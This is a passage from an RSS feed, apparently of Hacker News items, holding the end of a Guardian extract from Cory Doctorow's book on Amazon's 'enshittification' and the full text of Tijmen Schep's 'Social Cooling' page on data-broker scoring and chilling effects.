    &lt;p&gt;It gets worse. On average, the first result in an Amazon search is 29% more expensive than the best match for your search. Click any of the top four links on the top of your screen and you’ll pay an average of 25% more than you would for your best match – which, on average, is located 17 places down in an Amazon search result.&lt;/p&gt;
    &lt;p&gt;Why does this happen? Because Amazon makes more than $50bn every year charging merchants for search placement. When you search for a product on Amazon, the top results aren’t the best matches: they’re the matches that pay the highest fees to Amazon to be top of the list.&lt;/p&gt;
    &lt;p&gt;Researchers Rory Van Loo and Nikita Aggarwal call this “Amazon’s pricing paradox”. Amazon gets to insist that it has the lowest prices in the business, but no one can find those prices. Instead, we all pay a massive Amazon tax every time we shop there, and the merchants we buy from are paying an Amazon tax, too.&lt;/p&gt;
    &lt;p&gt;That means that, on average, the stuff at the top of an Amazon search results page is bad. It’s low-quality, high-priced junk. Even when you’re buying a known quantity, such as a specific brand of AA batteries, the top item will usually be more expensive than the items lower down on the page – the ones without the splashy banners advertising “Best Seller” or “Amazon’s Choice”. The Amazon smile logo gets a lot more sinister when it appears next to a top search result that costs 29% more than the best match for your query, thanks to Amazon’s $50bn-a-year paid search placement.&lt;/p&gt;
    &lt;p&gt;Not that you can find lower prices through anything as simple as sorting your search results by price. The merchants that dominate the search listings will play games with quantity to have the result with the lowest price, even if the price per unit is much higher. For example, a four-pack of AAs priced at $3.99 is more expensive per battery than a 16-pack priced at $10 (ie $1 versus $0.63), but sort-by-lowest-price will bury the better deal on the third or fourth page of results.&lt;/p&gt;
    &lt;p&gt;This is only the beginning. Amazon has clawed back value from buyers and sellers in many more ways. It underinvests in anti-fraud, so the top-scoring items with the highest user ratings are often terrible but are garlanded with (paid) rave reviews. Merchants with high-quality offerings are faced with two bad options: either they sink to the bottom of the rankings, or they cheat, too. If they do cheat, they’ll have to raise the prices of their merchandise in order to pay for the specialised fraud-as-a-service scum who gin up all those fake reviews. Then, if they get caught, they’ll be banished from Amazon and either go bust or have to start all over again under a new business name.&lt;/p&gt;
    &lt;p&gt;But for Amazon, all of this is fine. It’s how its system works, its flywheel. Amazon makes money when you are satisfied, and when you’re furious. The costs are borne by sellers, and by you. Why would the company invest in fighting fraud under those circumstances?&lt;/p&gt;
    &lt;p&gt;That’s also why Amazon puts so little effort into policing rotten sellers – and why so many of the “brands” there are consonant-heavy nonsense strings, seemingly generated at random by fly-by-nights that pop up and disappear, then pop up again under a new name.&lt;/p&gt;
    &lt;p&gt;This is end-stage enshittification. Amazon locked in its customers, then squeeeeezed, counting on a few good, desperate sellers to keep the system going. Then it clawed value away from its good sellers, leaving behind bad sellers that are a further source of misery for us.&lt;/p&gt;
    &lt;p&gt;Now Amazon is in the terminal stage. We’re all still stuck to the platform, but we get less and less value out of it. And because we’re all still there, buying Prime and starting (and ending) our purchase planning with Amazon’s enshittified search results, the merchants who rely on selling to us are stuck there, too, earning less and less from every sale.&lt;/p&gt;
    &lt;p&gt;The platform has turned into a pile of shit, and we’re at the bottom of it.&lt;/p&gt;
    &lt;p&gt;A confession: I am no true believer in markets as the best arbiter of how our society should work, who should be in charge of it and how its productive capacity should be organised. Like other leftists, I am deeply suspicious of capitalism. I understand the temptation to look at all this verbiage about enshittification, throw your hands up and say, “What do you expect? Capitalism always produces crises of production. Enshittification is just a sweary euphemism for capitalism.”&lt;/p&gt;
    &lt;p&gt;But this is wrong. There are meaningful differences between the internet as it stands today – the enshitternet – and the old, good internet we once had. The enshitternet is a source of pain, precarity and immiseration for the people we love. The indignities of harassment, scams, disinformation, surveillance, wage theft, extraction and rent-seeking have always been with us, but they were a minor sideshow on the old, good internet and they are the everything and all of the enshitternet.&lt;/p&gt;
    &lt;p&gt;This has real, material consequences for our comrades in the struggle for a better world. The internet that spawned Occupy and Black Lives Matter has become hostile to the maintenance of radical political movements and is inimical to the founding of new ones. That really matters. Not because the internet is the most important issue facing us today. Far from it. Compared with the climate emergency, genocide, inequality, corruption, democratic backsliding, authoritarianism and sustained racist, homophobic, misogynist and transphobic attacks, the internet is just a sideshow. But the internet is the terrain upon which these fights will be waged. It is the communications medium we will use to organise to save our species and planet from their imminent eradication. We can’t win these fights without a free, fair and open internet.&lt;/p&gt;
    &lt;p&gt;Audre Lorde was far smarter than I am about nearly everything, but when she wrote, “The master’s tools will never dismantle the master’s house”, she was manifestly wrong. The master’s tools were used to build that house in the first place – that makes them the ideal tools to take it to bits and rebuild it to shelter us.&lt;/p&gt;
    &lt;p&gt;We can halt the creeping enshittification of every digital device. We can build a better, enshittification-resistant digital nervous system, one fit to coordinate the mass movements we will need to fight fascism, end genocide and save our planet and our species.&lt;/p&gt;
    &lt;p&gt;You won’t be able to do it alone. Your personal consumption choices might make a difference to the merchants you patronise, but they have no effect on the policies that created our enshittogenic environment. Just as you can’t save the planet by diligently sorting your recycling, you can’t stop enshittification by “voting with your wallet” (those votes are always won by those with the thickest wallets, and that’s the billionaires who made money by enshittifying everything).&lt;/p&gt;
    &lt;p&gt;Take Amazon: to fix Amazon, we need policy solutions. We need to ban predatory pricing – selling goods below cost to keep competitors out of the market (and then jacking them up again). We need to impose structural separation on the company so it can either be a platform, or compete with the sellers that rely on it as a platform. We need to curb its junk fees, which suck 45-51 cents on every dollar merchants take in. We need to end its most favoured nation deal, which forces merchants who raise their prices on Amazon to pay these fees to raise their prices everywhere else, too. We need to unionise its drivers and warehouse workers. We need to treat its rigged search results as the fraud they are.&lt;/p&gt;
    &lt;p&gt;The path to a better Amazon doesn’t lie through consumer activism, or appeals to the its conscience. Corporations, being artificial, immortal colony-organisms that use humans as their inconvenient gut flora, do not have consciences to appeal to. The path leads through coalitions: of consumers and merchants who are tired of being robbed; of workers who are tired of being immiserated and maimed; of competitors who are tired of being strong-armed by a monopolist bully; of tax-justice activists who are tired of trillion-dollar multinationals ducking their obligations. Systemic problems have systemic solutions, not individual ones. You can’t shop your way out of a monopoly.&lt;/p&gt;
    &lt;p&gt;Martin Luther King Jr once said, “It may be true that the law cannot make a man love me, but it can stop him from lynching me, and I think that’s pretty important, also.”&lt;/p&gt;
    &lt;p&gt;It may be true that regulation can’t force corporate sociopaths to conceive of you as a human being entitled to dignity and fair treatment, and not just an ambulatory wallet, a supply of gut bacteria for the immortal colony organism that is a limited liability corporation. But it can make that exec fear you enough to treat you fairly and afford you dignity, even if he doesn’t think you deserve it. And I think that’s pretty important.&lt;/p&gt;
    &lt;p&gt;This is an edited extract from Enshittification: Why Everything Suddenly Got Worse and What to Do About It by Cory Doctorow, published by Verso at £22 on 14 October. To support the Guardian, order your copy at guardianbookshop.com&lt;/p&gt;
    &lt;p&gt;When asked to comment for this article, an Amazon spokesman said its description of the relationship between Amazon and independent sellers appeared to be “inacccurate and misleading”, adding, “The truth is millions of independent sellers are thriving in Amazon’s store, including many who choose not to use our optional fulfilment services, which are competitively priced and often provide better value than alternatives. Amazon consistently offers customers the lowest prices across the widest selection of products and was recognised in 2024 by independent research firm Profitero as the lowest-priced UK retailer for the fifth year running. Items sold by third-party sellers are backed with our A-to-z Guarantee, enabling customers to request a refund if an item is damaged, defective or not as described.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45479103</guid><pubDate>Sun, 05 Oct 2025 05:47:55 +0000</pubDate></item><item><title>Social Cooling</title><link>https://www.socialcooling.com/</link><description>&lt;doc fingerprint="3ab8db3d68f3a42d"&gt;
  &lt;main&gt;
    &lt;head rend="h3"&gt;LIKE OIL LEADS TO GLOBAL WARMING...&lt;/head&gt;
    &lt;head rend="h2"&gt;DATA LEADS TO SOCIAL COOLING&lt;/head&gt;
    &lt;head rend="h2"&gt;If you feel you are being watched, you change your behavior.&lt;/head&gt;
    &lt;head rend="h2"&gt;Big Data is supercharging this effect.&lt;/head&gt;
    &lt;head rend="h2"&gt;This could limit your desire to take risks or exercise free speech.&lt;/head&gt;
    &lt;head rend="h2"&gt;Over the long term these 'chilling effects' could 'cool down' society.&lt;/head&gt;
    &lt;head rend="h1"&gt;Your data is turned into thousands of different scores.&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;There are stars behind the cloud:&lt;/p&gt;
    &lt;p&gt;Databrokers compare your data to the data of people they know more about. By comparing the patterns they try to guess the likelihood of thousands of details that you may never have disclosed. These are actual examples:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Religion&lt;/item&gt;
      &lt;item&gt;Rape victim&lt;/item&gt;
      &lt;item&gt;Into dieting&lt;/item&gt;
      &lt;item&gt;Into gardening&lt;/item&gt;
      &lt;item&gt;Number of online friends&lt;/item&gt;
      &lt;item&gt;Number of real friends&lt;/item&gt;
      &lt;item&gt;IQ&lt;/item&gt;
      &lt;item&gt;Political views&lt;/item&gt;
      &lt;item&gt;Had abortion&lt;/item&gt;
      &lt;item&gt;Gullibility&lt;/item&gt;
      &lt;item&gt;Projected sexual orientation&lt;/item&gt;
      &lt;item&gt;Real sexual orientation&lt;/item&gt;
      &lt;item&gt;Reads magazines on travel&lt;/item&gt;
      &lt;item&gt;Reads books on travel&lt;/item&gt;
      &lt;item&gt;Planning to have a baby&lt;/item&gt;
      &lt;item&gt;Communication device preference&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Has house plants&lt;/item&gt;
      &lt;item&gt;Neuroticism&lt;/item&gt;
      &lt;item&gt;Openness&lt;/item&gt;
      &lt;item&gt;Date of Birth&lt;/item&gt;
      &lt;item&gt;Into Fashion&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Parents divorced before the age of 21&lt;/item&gt;
      &lt;item&gt;Economic stability&lt;/item&gt;
      &lt;item&gt;Potential inheritor&lt;/item&gt;
      &lt;item&gt;Extraversion&lt;/item&gt;
      &lt;item&gt;Agreeableness&lt;/item&gt;
      &lt;item&gt;Year house built&lt;/item&gt;
      &lt;item&gt;Smoker in the household&lt;/item&gt;
      &lt;item&gt;Has 'senior needs'&lt;/item&gt;
      &lt;item&gt;Has 'diabetic focus'&lt;/item&gt;
      &lt;item&gt;Easily addictable&lt;/item&gt;
      &lt;item&gt;Physical frailty&lt;/item&gt;
      &lt;item&gt;Gun owner&lt;/item&gt;
      &lt;item&gt;Adult 'empty nester'&lt;/item&gt;
      &lt;item&gt;Education level&lt;/item&gt;
      &lt;item&gt;Runs marathons&lt;/item&gt;
      &lt;item&gt;Into Elvis Memorabilia&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;People are starting to realize that this 'digital reputation' could limit their opportunities.&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;(And that these algorithms are often biased, and built on bad data.)&lt;/p&gt;
    &lt;head rend="h3"&gt;In the news&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;You may not get that dream job if your data suggests you're not a very positive person.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;If you are a woman you may see fewer ads for high paying jobs.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;If you have "bad friends" on social media you might pay more for your loan.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;Tinder's algorithms might not show you attractive people if you are not desirable yourself.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;Cambridge Analytica created psychological profiles on all Americans to try and dissuade people from voting.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;If you return goods to the store often this will be used against you.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;What you post on social media may influence your odds of getting a tax audit.&lt;/head&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;head rend="h3"&gt;Your health insurer may collect intimate data about your lifestyle, race and more.&lt;/head&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;People are changing their behavior to get better scores.&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;This has good and bad sides.&lt;/p&gt;
    &lt;head rend="h2"&gt;Social Cooling is a name for the long-term negative side effects of living in a reputation economy:&lt;/head&gt;
    &lt;head rend="h3"&gt;1. A culture of conformity&lt;/head&gt;
    &lt;p&gt;Have you ever hesitated to click on a link because you thought your visit might be logged, and it could look bad?&lt;/p&gt;
    &lt;p&gt;More and more people feel this pressure, and they are starting to apply self-censorship.&lt;/p&gt;
    &lt;head rend="h3"&gt;2. A culture of risk-aversion&lt;/head&gt;
    &lt;p&gt;When doctors in New York were given scores this had unexpected results.&lt;lb/&gt; Doctors that tried to help advanced cancer patients had a higher mortality rate, which translated into a lower score.&lt;/p&gt;
    &lt;p&gt;Doctors that didn't try to help were rewarded with high scores, even though their patients died prematurely.&lt;/p&gt;
    &lt;p&gt;Rating systems can create unwanted incentives, and increase pressure to conform to a bureaucratic average.&lt;/p&gt;
    &lt;head rend="h3"&gt;3. Increased social rigidity&lt;/head&gt;
    &lt;p&gt;Digital reputation systems are limiting our ability and our will to protest injustice.&lt;/p&gt;
    &lt;p&gt;In China each adult citizen is getting a government mandated "social credit score". This represents how well behaved they are, and is based on crime records, what they say on social media, what they buy, and even the scores of their friends.&lt;/p&gt;
    &lt;p&gt;If you have a low score you can't get a government job, visa, cheap loan, or even a nice online date.&lt;/p&gt;
    &lt;p&gt;Social pressure is the most powerful and most subtle form of control.&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt; As our weaknesses are mapped..&lt;/p&gt;
    &lt;head rend="h1"&gt;We are becoming too transparent.&lt;/head&gt;
    &lt;head rend="h1"&gt;This is breeding a society where self-censorship and risk-aversion are the new normal.&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt; Yes, we've had credit ratings before. But this is a whole new scale, with an incredible level of automation, integration and accessibility.&lt;/p&gt;
    &lt;p&gt;The solution?&lt;/p&gt;
    &lt;head rend="h1"&gt;We should compare this problem to Global Warming.&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;head rend="h2"&gt;Social Cooling is subtle&lt;/head&gt;The pollution of our social environment is invisible to most people, just like air pollution was at first.&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h2"&gt;Social Cooling is complex&lt;/head&gt;It cannot be solved by politicians, citizens, entrepreneurs or scientists on their own.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;&lt;lb/&gt;Public awareness is still very low.&lt;/head&gt;
    &lt;p&gt;It took 40 years to get the problems with oil on the agenda, and 80 years to get to where we are now.&lt;lb/&gt; We can't take that long with Social Cooling.&lt;/p&gt;
    &lt;head rend="h2"&gt;In the next 10 years we will need to spread a more mature and nuanced perception of data and privacy.&lt;/head&gt;
    &lt;head rend="h2"&gt;As pressure to be perfect rises we will learn what privacy really is:&lt;/head&gt;
    &lt;p/&gt;
    &lt;p&gt;&lt;lb/&gt;Can we still forgive and forget?&lt;/p&gt;
    &lt;head rend="h2"&gt;When algorithms judge everything we do, we need to protect the right to make mistakes.&lt;/head&gt;
    &lt;head rend="h2"&gt;&lt;lb/&gt; When everything is remembered as big data, we need the right to have our mistakes forgotten.&lt;/head&gt;
    &lt;p&gt;In our data driven world..&lt;/p&gt;
    &lt;head rend="h2"&gt;Help spread the word&lt;/head&gt;
    &lt;p&gt;These are privacy-friendly sharing buttons.&lt;/p&gt;
    &lt;p&gt;Site by Tijmen Schep - Technology critic, privacy designer and public speaker.&lt;/p&gt;
    &lt;head rend="h2"&gt;Like this? Then also visit Mathwashing.com, HowNormalAmI.eu or cloakingcompany.com.&lt;/head&gt;
    &lt;p&gt;Feel free to re-use content, it's all under a CC-BY 4.0 License.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45479165</guid><pubDate>Sun, 05 Oct 2025 06:01:24 +0000</pubDate></item></channel></rss>